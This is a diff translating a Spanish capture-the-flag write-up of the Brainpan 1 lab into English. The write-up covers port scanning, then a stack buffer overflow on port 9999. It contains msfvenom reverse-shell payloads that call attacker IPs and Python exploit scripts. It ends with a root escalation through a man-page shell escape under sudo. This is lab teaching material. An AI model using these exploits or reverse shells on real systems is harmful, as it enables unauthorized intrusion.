@@ -1,9 +1,9 @@
 ﻿# Writeup: Brainpan 1
 
 # Brainpan 1
-## Enumeración
+## Enumeration
 
->Al realizarle un ICMP ECHO Request podemos observar que se trata de una máquina Linux debido a su TTL que tiende a 64:
+>When we send an ICMP ECHO request to it, we can see that it is a Linux machine because its TTL is set to 64:
 
 ```bash
 ping -c 3 IP
@@ -11,7 +11,7 @@ ping -c 3 IP
 
 ![Pasted image 20240821222952](https://github.com/user-attachments/assets/ecb9e614-9d07-4636-817e-7fbf17796654)
 
->Ahora, vamos a proceder a realizar un escaneo de puertos abiertos a la máquina para observar los posibles servicios expuestos que posee:
+>Now, let's proceed to scan the machine for open ports to identify any services it may have exposed:
 
 ```bash
 nmap -p- --open -sS -Pn -n -vvv --min-rate 5000 IP
@@ -19,7 +19,7 @@ nmap -p- --open -sS -Pn -n -vvv --min-rate 5000 IP
 
 ![Pasted image 20240821223003](https://github.com/user-attachments/assets/f9719821-b286-4799-aee8-1c38b41f107f)
 
->Ahora realizaremos un escaneo más exhaustivo empleando scripts de reconocimiento para averiguar la versión de los servicios que corren en la máquina y cosas interesantes acerca de ellos:
+>We will now carry out a more thorough scan using reconnaissance scripts to find out the version of the services running on the machine and some interesting details about them:
 
 ```bash
 nmap -p[ListaPuertos] -sCV -Pn -n -vvv IP
@@ -27,7 +27,7 @@ nmap -p[ListaPuertos] -sCV -Pn -n -vvv IP
 
 ![Pasted image 20240821223129](https://github.com/user-attachments/assets/9195709a-5bb5-40be-bd21-8700aa9ff8c4)
 
->Como el puerto TCP 10000 está alojando un servicio web, vamos a enumerar posibles directorios mediante la herramienta **gobuster**:
+>As TCP port 10000 is hosting a web service, we are going to enumerate possible directories using the **gobuster** tool:
 
 ```bash
 gobuster dir -u "http://IP:10000" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt
@@ -35,29 +35,29 @@ gobuster dir -u "http://IP:10000" -w /usr/share/seclists/Discovery/Web-Content/d
 
 ![Pasted image 20240821223346](https://github.com/user-attachments/assets/f0c1ea71-71ff-4a74-9038-83faaff645b3)
 
->Vamos a entrar al directorio bin que se encuentra en el servidor web y encontramos un ejecutable, lo descargaremos y procederemos a realizar pruebas de ingeniería inversa con él.
+>Let's navigate to the ``bin`` directory on the web server, where we'll find an executable file. We'll download it and carry out some reverse engineering tests on it.
 
 ![Pasted image 20240821223416](https://github.com/user-attachments/assets/3f76a03c-b7f9-4ee5-a74d-95b385db3d2f)
 
->Una vez hecho esto, se lo compartiremos a una máquina Windows 7 para mediante Inmunity Debugger comenzar a realizar el proceso de ingeniería inversa.
+>Once this is done, we will share it with a Windows 7 machine so that we can begin the reverse engineering process using ``Immunity Debugger``.
 
->Una vez lancemos el binario y lo unamos con inmunity debugger deberemos conectarnos a él mediante netcat para interactuar con él:
+>Once we have launched the binary and linked it to Immunity Debugger, we will need to connect to it via netcat in order to interact with it:
 
 ```bash
 nc IP 9999
 ```
 
->Vamos a tratar de desbordar el buffer agregando una gran cantidad de contenido para ver si llega a sobreescribir el registro EIP debido a su mal manejo de la memoria:
+>Let's try to cause a buffer overflow by adding a large amount of content to see if it overwrites the EIP (Instruction Pointer) register due to its poor memory management:
 
 ![Pasted image 20240821230518](https://github.com/user-attachments/assets/5b622ba8-2b67-434a-822f-4c5867085ee1)
 
->Y como podemos ver, el registro EIP vale 41414141 que es la equivalencia a AAAA en hexadecimal:
+>And as we can see, the EIP register holds the value 41414141, which is equivalent to AAAA in hexadecimal:
 
 ![Pasted image 20240821230615](https://github.com/user-attachments/assets/3c1a685f-dbc7-4236-a58d-e95949ea2452)
 
-## Explotación
+## Exploitation
 
->Ahora que sabemos que podemos sobreescribir el registro EIP, vamos a averiguar en qué punto exacto es donde esto ocurre, para ello emplearemos una utilidad de metasploit que nos permitirá crear un patrón para, sabiendo el valor del EIP, conseguir averiguar el número de caracteres a poner antes de que se sobreescriba el registro EIP:
+>Now that we know we can overwrite the EIP register, let's find out exactly where this happens. To do this, we'll use a Metasploit tool that will allow us to create a pattern so that, once we know the value of the EIP, we can work out the number of characters to insert before the EIP register is overwritten:
 
 ```bash
 msf-pattern-create -l 1000
@@ -65,11 +65,11 @@ msf-pattern-create -l 1000
 
 ![Pasted image 20240821231838](https://github.com/user-attachments/assets/5e8e68fb-d733-4b7b-aebc-3d59abbc073c)
 
->Como podemos ver, el registro EIP tras lanzar el patrón tiene como valor 35724134, vamos a tratar de emplear la utilidad de metasploit que comparará el patrón con el resultado para decirnos el offset:
+>As we can see, the EIP register after launching the pattern has a value of 35724134; we're going to try using the Metasploit tool that will compare the pattern with the result to tell us the offset:
 
 ![Pasted image 20240821231903](https://github.com/user-attachments/assets/b8be39cc-bfcb-4968-82fb-d58cfbf32b38)
 
->Para ello, indicaremos la longitud del patrón y el valor del registro EIP:
+>To do this, we will specify the pattern length and the EIP register value:
 
 ```bash
 msf-pattern_offset -l 1000 -q 35724134
@@ -77,7 +77,7 @@ msf-pattern_offset -l 1000 -q 35724134
 
 ![Pasted image 20240821232018](https://github.com/user-attachments/assets/eb53f413-6c7a-42bc-a88f-c2aa216b5ca6)
 
->Nos ha dicho que el offset sería de 524 por lo que vamos a comprobarlo con un patrón personalizado que tratará de escribir solo 4 B en el registro EIP y varias C para ver si llega directamente a la pila lo que siga después del EIP:
+>It has told us that the offset would be 524, so we are going to check this using a custom pattern that will attempt to write just 4 Bs to the EIP register and several Cs to see if whatever comes after the EIP goes straight onto the stack:
 
 ```bash
 python3 -c 'print("A"*524 + "B"*4 + "C"*100)'
@@ -85,14 +85,14 @@ python3 -c 'print("A"*524 + "B"*4 + "C"*100)'
 
 ![Pasted image 20240821232129](https://github.com/user-attachments/assets/ad37a758-1979-4f3a-96a6-c74b63d0be73)
 
->Si lo lanzamos en la aplicación, podremos ver que el registro EIP vale exactamente 42424242 que equivale a nuestras 4 B:
+>If we run it in the application, we can see that the EIP register is exactly 42424242, which is equivalent to our 4 Bs:
 
 ![Pasted image 20240821232338](https://github.com/user-attachments/assets/f9706b20-48bb-4be0-b18f-34e9e3699833)
 ![Pasted image 20240821232412](https://github.com/user-attachments/assets/6ab9a610-f02d-4960-8cd3-81d86926f595)
 
->Ahora tocará obtener los badchars que no soporta la aplicación. Vamos a excluir los siguientes badchars ya que son los más comunes: **\x00\x0a\x0d**
+>Now we need to identify the bad characters that the application does not support. We're going to exclude the following bad characters as they are the most common: **\x00\x0a\x0d**
 
->Ahora, vamos a generar el shellcode que vamos a ejecutar en la pila al realizar el Buffer Overflow, yo emplearé una reverse shell de windows por TCP:
+>Now, let's generate the shellcode that we're going to execute on the stack when we carry out the buffer overflow; I'll be using a Windows reverse shell over TCP:
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.42 LPORT=443 -f py -v shellcode -b "\x00\x0a\x0d"
@@ -101,7 +101,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.42 LPORT=443 -f py -v shel
 ![Pasted image 20240821233000](https://github.com/user-attachments/assets/9abafe06-a39a-4ac5-9817-04d01386ad74)
 
 
->Para llevar a cabo la explotación, deberemos crear un script en python como el siguiente:
+>To carry out the exploit, we will need to create a Python script like the one below:
 
 ```python
 #!/usr/bin/python3
@@ -157,7 +157,7 @@ s.send(payload)
 s.close
 ```
 
->Ahora vamos a encontrar el OpCode correspondiente a la acción JMP ESP para poder hacer que el EIP apunte a la pila y esta sea la que ejecute nuestro shellcode:
+>Now we’re going to find the OpCode corresponding to the JMP ESP instruction so that we can make the EIP point to the stack, allowing the stack to execute our shellcode:
 
 ```python
 !mona jmp -r esp
@@ -165,13 +165,13 @@ s.close
 
 ![Pasted image 20240821235435](https://github.com/user-attachments/assets/bfdf506a-cdf1-45e1-8ace-6f416506e115)
 
->Una vez obtenido el OpCode deberemos pasarlo a little endian, para ello deberemos de dos en dos dígitos desde el final hacia atrás ir iterando por los valores separándolos por `\x` como se muestra a continuación:
+>Once we have obtained the OpCode, we must convert it to little-endian format. To do this, we must iterate through the values two digits at a time, starting from the end and working backwards, separating them with `\x` as shown below:
 
 ```python
 0x311712f3 ----> \xf3\x12\x17\x31
 ```
 
->Una vez montado el script, solo deberemos agregarle permisos de ejecución, escuchar mediante netcat y ejecutar el script y obtendremos una reverse shell de la máquina en la que estamos realizando el proceso de ingeniería inversa:
+>Once the script has been set up, we simply need to grant it execute permissions, listen via netcat and run the script, and we will obtain a reverse shell on the machine on which we are carrying out the reverse engineering process:
 
 ```bash
 nc -nlvp 443
@@ -181,13 +181,13 @@ python3 exploit.py
 ![Pasted image 20240830155713](https://github.com/user-attachments/assets/5b9c9898-ec5f-459a-920b-3a1762baeb5f)
 
 
->Ahora que hemos visto que podemos ejecutar código debido a la vulnerabilidad en el manejo de la memoria de la aplicación, deberemos modificarlo para apuntar a la máquina víctima. Para ello, vamos a emplear un nuevo shellcode para pasar por la VPN:
+>Now that we have seen that we can execute code due to the vulnerability in the application's memory handling, we need to modify it to target the victim's machine. To do this, we are going to use a new shellcode to pass through the VPN:
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.8.3.105 LPORT=443 -f py -v shellcode -b "\x00\x0a\x0d"
 ```
 
->Y realizaremos un cambio al script anterior, cambiando el shellcode y la IP a la que apunta el **s.connect**:
+>And we'll make a change to the previous script, altering the shellcode and the IP address that **s.connect** points to:
 
 ```python
 #!/usr/bin/python3
@@ -243,17 +243,17 @@ s.send(payload)
 s.close
 ```
 
->Si nos ponemos en escucha con netcat y lanzamos el script, podremos ver que hemos ganado acceso a la máquina víctima:
+>If we set up a listening connection with netcat and run the script, we will see that we have gained access to the victim's machine:
 
 ![Pasted image 20240830160217](https://github.com/user-attachments/assets/dd0fcbd8-60f0-4274-822b-ed1a23d1a119)
 
->Ahora, deberemos saltar a la máquina linux real que está cargando el subsistema de Windows, por lo que deberemos modificar el script del buffer overflow para tratar de entablarnos una reverse shell pero empleando un shellcode para Linux x86:
+>Now, we need to switch to the actual Linux machine that is running the Windows subsystem, so we’ll need to modify the buffer overflow script to try and establish a reverse shell, but using shellcode for Linux x86:
 
 ```bash
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.8.3.105 LPORT=443 -f py -v shellcode -b "\x00\x0a\x0d"
 ```
 
->Script modificado con el shellcode correspondiente a una reverse shell para Linux:
+>Script modified with the shellcode corresponding to a reverse shell for Linux:
 
 ```python
 #!/usr/bin/python3
@@ -286,7 +286,7 @@ s.send(payload)
 s.close
 ```
 
->Ahora, podemos ver que hemos ganado acceso a la máquina original y, como podemos ver, se trata de un Ubuntu quantal:
+>Now, we can see that we have gained access to the original machine and, as we can see, it is running Ubuntu Quantal:
 
 ```bash
 lsb_release -a
@@ -296,7 +296,7 @@ lsb_release -a
 
 
 
->Ahora vamos a realizar un tratamiento de la TTY para obtener una shell 100% interactiva pudiendo emplear shortcuts:
+>Now we’re going to process the TTY to obtain a 100% interactive shell where we can use shortcuts:
 
 ```bash
 script /dev/null -c bash
@@ -311,7 +311,7 @@ stty rows numFilas columns numColumnas
 
 # Escalada de privilegios
 
->Si empleamos el siguiente comando, podremos ver que el usuario puck puede lanzar el binario anansi_util como root sin proporcionar contraseña:
+>If we run the following command, we can see that the user ``puck`` can execute the ``anansi_util`` binary as root without entering a password:
 
 ```bash
 sudo -l
@@ -319,7 +319,7 @@ sudo -l
 
 ![Pasted image 20240822092238](https://github.com/user-attachments/assets/09a1fa6d-437b-424d-9d3b-9122c6f05200)
 
->Como podemos ver, esta utilidad nos lanza un manual de un comando de la siguiente forma, por lo que como quien lanza el comando será root podremos escalar privilegios gracias a la ventana de manual:
+>As we can see, this utility displays a manual command in the following way; therefore, as the person running the command will be root, we can escalate privileges via the manual window:
 
 ```bash
 sudo /home/anansi/bin/anansi_util manual ls
@@ -327,7 +327,7 @@ sudo /home/anansi/bin/anansi_util manual ls
 
 ![Pasted image 20240822092323](https://github.com/user-attachments/assets/a105df1d-4a8a-4821-b970-2641fa0f1b29)
 
->Si una vez abierto el manual, escribimos lo siguiente, conseguiremos una shell como el usuario root:
+>If, once the manual is open, we type the following, we will gain a shell as the root user:
 
 ```bash
 !/bin/bash
@@ -335,11 +335,11 @@ sudo /home/anansi/bin/anansi_util manual ls
 
 ![Pasted image 20240822092346](https://github.com/user-attachments/assets/5f1e97c0-63ea-4857-ad30-95db152de5eb)
 
->Una vez hecho esto, podemos ver que hemos obtenido una shell como el usuario root:
+>Once this is done, we can see that we have gained a shell as the root user:
 
 ![Pasted image 20240822092400](https://github.com/user-attachments/assets/1aaa41ad-6483-4993-8900-7981b32ddeb3)
 
->Por último, la flag se encuentra en el directorio de root:
+>Finally, the flag is located in the root directory:
 
 ![Pasted image 20240822092434](https://github.com/user-attachments/assets/5b099bc5-f45f-4ecb-ab1c-c6a7c3b3ecb4)
 
